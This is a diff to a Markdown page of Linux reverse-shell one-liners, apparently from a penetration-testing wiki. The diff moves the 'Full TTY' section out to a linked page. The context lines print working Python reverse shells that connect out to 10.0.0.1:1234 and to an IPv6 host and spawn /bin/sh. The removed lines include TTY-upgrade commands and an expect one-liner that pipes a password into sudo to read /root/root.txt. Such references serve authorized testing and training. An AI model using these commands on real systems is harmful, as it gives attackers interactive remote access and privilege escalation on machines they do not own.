@@ -1,5 +1,9 @@
 # Shells - Linux
 
+## Full TTY
+
+**Once you get a reverse shell**[ **read this page to obtain a full TTY**](full-ttys.md)**.**
+
 ## Bash \| sh
 
 ```bash
@@ -62,29 +66,6 @@ export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 #IPv6
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 
-```
-
-## Full TTY
-
-Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found the /etc/shells file   
-This incident has been reported`.
-
-```bash
-python -c 'import pty; pty.spawn("/bin/bash")'
-(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
-```
-
-```bash
-script -qc /bin/bash /dev/null
-(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset; 
-```
-
-## No TTY
-
-If for some reason you cannot obtain a full TTY you **still can interact with programs** that expects user input. In the following example, the password is passed to `sudo` to read a file:
-
-```bash
-expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
 
 ## Perl
